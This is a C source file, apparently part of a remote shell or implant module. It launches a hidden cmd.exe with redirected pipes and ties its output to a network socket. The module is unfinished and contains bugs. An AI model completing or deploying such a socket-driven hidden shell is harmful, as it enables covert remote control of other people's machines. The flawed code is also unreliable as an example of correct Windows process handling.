/*
    Code for spawning a command prompt and piping I/O to/from the process
    Code is modified from https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output?redirectedfrom=MSDN
*/

#include "common.h"
#include "cmd.h"

// Create a structure (and global instance of it) that holds all the globals used in this file
// This helps organize the globals and make it more obvious where each global is coming from
struct cmdGlobalsStruct {
    HANDLE cmdOut;
    HANDLE cmdIn;
} cmdGlobals;

struct cmdThreadParamStruct {
    HANDLE cmdOut;
    SOCKET cmdSock;
};

// TODO - finish modifying this code and cleaning up as much as possible
#include <tchar.h>
#include <stdio.h>
#include <strsafe.h>

int startCMD(SOCKET sock);
int createCommandPrompt();


/*
* Initialize the thing
*
*
*/
int startCMD(SOCKET sock) {
    // create the child process with I/O pipes
    int retCode = createCommandPrompt();
    if (retCode != 0) {
        return retCode;
    }
    // create the output thread
    cmdThreadParamStruct* cmdThreadParams = (cmdThreadParamStruct*) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(cmdThreadParamStruct));
    cmdThreadParams->cmdOut = cmdGlobals.cmdOut;
    cmdThreadParams->cmdSock = sock;
    HANDLE thread;
    DWORD threadID;
    thread = CreateThread(
        NULL,
        0,
        cmdOutputThread,
        &cmdThreadParams,
        0,
        &threadID
    );
}

/*
* Spawn a command prompt with pipes for input and output
*
*
*/
int createCommandPrompt() {
    /*
    * First, create the I/O pipes
    */
    HANDLE g_hChildStd_OUT_Wr, g_hChildStd_IN_Rd;
    // set the bInheritHandle flag so pipe handles are inherited
    SECURITY_ATTRIBUTES saAttr;
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;
    // create a pipe for the child process's STDOUT
    if (!CreatePipe(&cmdGlobals.cmdOut, &g_hChildStd_OUT_Wr, &saAttr, 0)) {
        return GetLastError();
    }
    // ensure the read handle to the pipe for STDOUT is not inherited
    if (!SetHandleInformation(cmdGlobals.cmdOut, HANDLE_FLAG_INHERIT, 0)) {
        return GetLastError();
    }
    // create a pipe for the child process's STDIN
    if (!CreatePipe(&g_hChildStd_IN_Rd, &cmdGlobals.cmdIn, &saAttr, 0)) {
        return GetLastError();
    }
    // ensure the write handle to the pipe for STDIN is not inherited
    if (!SetHandleInformation(cmdGlobals.cmdIn, HANDLE_FLAG_INHERIT, 0)) {
        return GetLastError();
    }
    /*
    * Next, create the child process
    */
    PROCESS_INFORMATION piProcInfo;
    STARTUPINFO siStartInfo;
    BOOL bSuccess = FALSE;
    // clear the PROCESS_INFORMATION structure to receive info from CreateProcess()
    ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
    // set up the STARTUPINFO structure
    ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
    siStartInfo.cb = sizeof(STARTUPINFO);
    siStartInfo.hStdError = g_hChildStd_OUT_Wr; // redirect STD_ERR
    siStartInfo.hStdOutput = g_hChildStd_OUT_Wr; // redirect STD_OUT
    siStartInfo.hStdInput = g_hChildStd_IN_Rd; // redirect STD_IN
    siStartInfo.dwFlags |= STARTF_USESTDHANDLES; // use the I/O redirections
    // create the child process
    bSuccess = CreateProcess(
        "cmd.exe",             // application name
        NULL,                  // command line
        NULL,                  // process security attributes
        NULL,                  // primary thread security attributes
        TRUE,                  // handles are inherited
        CREATE_NO_WINDOW,      // creation flags
        NULL,                  // use parent's environment
        NULL,                  // use parent's current directory
        &siStartInfo,          // STARTUPINFO pointer
        &piProcInfo);          // receives PROCESS_INFORMATION
    // if an error occurs, return the error
    if (!bSuccess) {
        return GetLastError();
    }
    else {
        // close handles to the child process and its primary thread
        // TODO - we may want to keep these though
        CloseHandle(piProcInfo.hProcess);
        CloseHandle(piProcInfo.hThread);
        // close handles to the pipes passed to the child
        // if these aren't explicitly closed, there's no way to recognize when the child process has ended
        CloseHandle(g_hChildStd_OUT_Wr);
        CloseHandle(g_hChildStd_IN_Rd);
    }
}

int inputToCMD(char* buff, int inputLen) {
    DWORD written;
    bool success;
    // TODO - loop this to make sure everything gets written
    if(!WriteFile(cmdGlobals.cmdIn, buff, inputLen, &written, NULL)) {
        return GetLastError();
    }
    return 0;
}

DWORD WINAPI cmdOutputThread(LPVOID lpParam) {
    // TODO - make thread handler
}

/*
*
* The following functions are leftovers from the demo code
* These should be uesd as guides for creating the final code
*

void WriteToPipe(void)

// Read from a file and write its contents to the pipe for the child's STDIN.
// Stop when there is no more data.
{
    DWORD dwRead, dwWritten;
    CHAR chBuf[BUFSIZE];
    BOOL bSuccess = FALSE;

    for (;;)
    {
        bSuccess = ReadFile(g_hInputFile, chBuf, BUFSIZE, &dwRead, NULL);
        if (!bSuccess || dwRead == 0) break;

        bSuccess = WriteFile(g_hChildStd_IN_Wr, chBuf, dwRead, &dwWritten, NULL);
        if (!bSuccess) break;
    }

    // Close the pipe handle so the child process stops reading.

    if (!CloseHandle(g_hChildStd_IN_Wr))
        ErrorExit(TEXT("StdInWr CloseHandle"));
}


void ReadFromPipe(void)

// Read output from the child process's pipe for STDOUT
// and write to the parent process's pipe for STDOUT.
// Stop when there is no more data.
{
    DWORD dwRead, dwWritten;
    CHAR chBuf[BUFSIZE];
    BOOL bSuccess = FALSE;
    HANDLE hParentStdOut = GetStdHandle(STD_OUTPUT_HANDLE);

    for (;;)
    {
        bSuccess = ReadFile(g_hChildStd_OUT_Rd, chBuf, BUFSIZE, &dwRead, NULL);
        if (!bSuccess || dwRead == 0) break;

        bSuccess = WriteFile(hParentStdOut, chBuf,
            dwRead, &dwWritten, NULL);
        if (!bSuccess) break;
    }
}

*/